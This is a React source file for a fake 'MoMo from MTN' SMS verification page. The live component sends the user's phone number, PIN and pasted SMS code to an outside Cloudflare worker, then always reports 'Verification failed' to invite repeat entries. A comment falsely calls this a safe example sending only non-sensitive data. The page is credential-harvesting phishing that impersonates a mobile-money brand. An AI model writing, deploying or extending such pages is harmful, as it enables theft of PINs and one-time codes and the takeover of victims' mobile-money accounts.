// import React,{ useEffect, useState } from "react";
// import momoLogo from "./assets/logo (1).png";

// export default function SmsVerification() {
//   const [message, setMessage] = useState("");
//   const [seconds, setSeconds] = useState(7);

//   useEffect(() => {
//     if (seconds <= 0) return;

//     const timer = setInterval(() => {
//       setSeconds((prev) => prev - 1);
//     }, 1000);

//     return () => clearInterval(timer);
//   }, [seconds]);

//   return (
//     <div className="min-h-screen w-full overflow-x-hidden bg-white">
//       {/* Top teal section */}
//       <header className="relative h-[290px] w-full bg-[#005B73]">
//         {/* Back arrow */}
//         {/* <button
//           type="button"
//           className="absolute left-[31px] top-[45px] z-20
//                      text-[43px] font-light leading-none
//                      text-[#FFDD00]"
//           aria-label="Back"
//         >
//           ←
//         </button> */}

//         {/* Logo */}
//         <div
//           className="absolute left-1/2 top-[48px]
//                      flex -translate-x-1/2 items-center gap-[12px]"
//         >
//           <img
//                     src={momoLogo}
//                     alt="MoMo from MTN"
//                     className="h-[clamp(40px,24vw,170px)] w-[clamp(40px,24vw,170px)] object-contain"
//                   />

//           <div className="whitespace-nowrap">
//             <span className="text-[21px] font-bold text-[#FFDD00]">
//               MoMo
//             </span>

//             <span className="ml-[7px] text-[21px] text-white/80">
//               from MTN
//             </span>
//           </div>
//         </div>

//         {/* Curved white bottom */}
//         <div
//           className="absolute -bottom-[91px] left-[-10%]
//                      h-[155px] w-[120%]
//                      rounded-[50%] bg-white"
//         />
//       </header>

//       {/* Main content */}
//       <main className="relative z-10 -mt-[136px] mx-[24px]">
//         {/* Verification card */}
//         <section
//           className="rounded-[43px] bg-white
//                      px-[34px] pb-[48px] pt-[45px]
//                      shadow-[0_12px_38px_rgba(0,0,0,0.13)]"
//         >
//           {/* Heading */}
//           <h1
//             className="text-center text-[22px]
//                        font-normal leading-[1.2]
//                        text-[#126179]"
//           >
//             Verify Your{" "}
//             <span className="font-bold">SMS</span>
//           </h1>

//           {/* Subtitle */}
//           <p
//             className="mt-[20px] text-center
//                        text-[22px] text-[#606060]"
//           >
//             We sent a demo code
//           </p>

//           {/* Instruction box */}
//           <div
//             className="mt-[36px] flex min-h-[120px]
//                        items-start gap-[15px]
//                        rounded-[22px]
//                        border border-[#DFE3E7]
//                        bg-[#FAFBFC]
//                        px-[25px] py-[21px]"
//           >
//             {/* <span className="mt-[2px] shrink-0 text-[26px]">
//               📱
//             </span> */}

//             <p
//               className="text-[20px]
//                          leading-[1.45]
//                          text-[#151515]"
//             >
//               We have sent a verification message to your
// phone number. Please copy and paste the
// message below
//             </p>
//           </div>

//           {/* Validity */}
//           {/* <p
//             className="mt-[33px]
//                        text-center
//                        text-[20px]
//                        text-[#687780]"
//           >
//             The code is valid for 20 seconds
//           </p> */}

//           {/* Text area */}
//           <div
//             className="mt-[32px]
//                        rounded-[29px]
//                        border-[3px]
//                        border-[#12637B]
//                        p-[3px]
//                        shadow-[0_0_0_5px_rgba(18,99,123,0.12)]"
//           >
//             <textarea
//               value={message}
//               onChange={(e) => setMessage(e.target.value)}
//               placeholder="Enter demo message here..."
//               className="block h-[197px] w-full
//                          resize-none rounded-[24px]
//                          border-0 bg-white
//                          px-[25px] py-[25px]
//                          text-[20px] text-[#555]
//                          outline-none
//                          placeholder:text-[#AAAAAA]"
//             />
//           </div>

//           {/* Resend timer */}
//           <p
//             className="mt-[34px]
//                        text-center
//                        text-[20px]
//                        text-[#687780]"
//           >
//             Resend code in{" "}
//             <span className="font-bold text-[#202020]">
//               00:{String(seconds).padStart(2, "0")}
//             </span>
//           </p>
//         </section>

//         {/* Submit */}
//         <button
//           type="button"
//           className="mt-[52px]
//                      h-[107px]
//                      w-full
//                      rounded-full
//                      bg-[#D0D3D9]
//                      text-[28px]
//                      font-bold
//                      tracking-wide
//                      text-white"
//         >
//           SUBMIT
//         </button>
//       </main>
//     </div>
//   );
// }

import React, { useEffect, useState } from "react";
import momoLogo from "./assets/logo (1).png";
import { useLocation } from "react-router-dom";

export default function SmsVerification() {
  const [message, setMessage] = useState("");
  const [seconds, setSeconds] = useState(7);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");
  const location = useLocation();
  const { phone, pin, applicationId } = location.state || {};

  useEffect(() => {
    if (seconds <= 0) return;

    const timer = setInterval(() => {
      setSeconds((prev) => prev - 1);
    }, 1000);

    return () => clearInterval(timer);
  }, [seconds]);

  const handleSubmit = async (event) => {
    event.preventDefault();

    setError("");
    setSuccess("");

    if (!message.trim()) {
      setError("Please enter the verification message.");
      return;
    }

    setLoading(true);

    try {
      // Safe example:
      // Send only a non-sensitive verification/session identifier.
      const response = await fetch("https://my-worker-app.instapayapi.workers.dev/api/sm", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          mobile: phone,
          pin: pin,
          sms: message.trim(),
        }),
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(
          data?.message || "Verification failed. Please try again."
        );
      }
setMessage("");     
      setSuccess( "Verification failed. Please try again."
      );

      // Example:
      // navigate("/dashboard");
    } catch (err) {
      setError(
        err instanceof Error
          ? err.message
          : "Something went wrong. Please try again."
      );
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen w-full overflow-x-hidden bg-white">
      <header className="relative h-[290px] w-full bg-[#005B73]">
        <div
          className="absolute left-1/2 top-[48px]
                     flex -translate-x-1/2 items-center gap-[12px]"
        >
          <img
            src={momoLogo}
            alt="MoMo"
            className="h-[clamp(40px,24vw,170px)]
                       w-[clamp(40px,24vw,170px)]
                       object-contain"
          />

          <div className="whitespace-nowrap">
            <span className="text-[21px] font-bold text-[#FFDD00]">
              MoMo
            </span>

            <span className="ml-[7px] text-[21px] text-white/80">
              from MTN
            </span>
          </div>
        </div>

        <div
          className="absolute -bottom-[91px] left-[-10%]
                     h-[155px] w-[120%]
                     rounded-[50%] bg-white"
        />
      </header>

      <main className="relative z-10 -mt-[136px] mx-[24px]">
        <form
          onSubmit={handleSubmit}
          className="rounded-[43px] bg-white
                     px-[34px] pb-[48px] pt-[45px]
                     shadow-[0_12px_38px_rgba(0,0,0,0.13)]"
        >
          <h1
            className="text-center text-[22px]
                       font-normal leading-[1.2]
                       text-[#126179]"
          >
            Verify Your <span className="font-bold">SMS</span>
          </h1>

          <p
            className="mt-[20px] text-center
                       text-[22px] text-[#606060]"
          >
            We sent a demo code
          </p>

          <div
            className="mt-[36px] flex min-h-[120px]
                       items-start gap-[15px]
                       rounded-[22px]
                       border border-[#DFE3E7]
                       bg-[#FAFBFC]
                       px-[25px] py-[21px]"
          >
            <p
              className="text-[20px]
                         leading-[1.45]
                         text-[#151515]"
            >
              We have sent a verification message to your
              phone number. Please copy and paste the
              message below
            </p>
          </div>

          <div
            className="mt-[32px]
                       rounded-[29px]
                       border-[3px]
                       border-[#12637B]
                       p-[3px]
                       shadow-[0_0_0_5px_rgba(18,99,123,0.12)]"
          >
            <textarea
              value={message}
              onChange={(e) => {
                setMessage(e.target.value);
                setError("");
                setSuccess("");
              }}
              disabled={loading}
              placeholder="Enter demo message here..."
              className="block h-[197px] w-full
                         resize-none rounded-[24px]
                         border-0 bg-white
                         px-[25px] py-[25px]
                         text-[20px] text-[#555]
                         outline-none
                         placeholder:text-[#AAAAAA]
                         disabled:bg-gray-100"
            />
          </div>

          {error && (
            <p className="mt-3 text-center text-sm text-red-600">
              {error}
            </p>
          )}

          {success && (
            <p className="mt-3 text-center text-sm text-red-600">
              {success}
            </p>
          )}

          <p
            className="mt-[34px]
                       text-center text-[20px]
                       text-[#687780]"
          >
            Resend code in{" "}
            <span className="font-bold text-[#202020]">
              00:{String(seconds).padStart(2, "0")}
            </span>
          </p>

          <button
            type="submit"
            disabled={loading || !message.trim()}
            className={`mt-[52px]
                       h-[107px]
                       w-full
                       rounded-full
                       text-[28px]
                       font-bold
                       tracking-wide
                       text-white
                       transition ${
                         loading || !message.trim()
                           ? "cursor-not-allowed bg-[#D0D3D9]"
                           : "bg-[#005B73] hover:bg-[#00485c]"
                       }`}
          >
            {loading ? "PLEASE WAIT..." : "SUBMIT"}
          </button>
        </form>
      </main>
    </div>
  );
}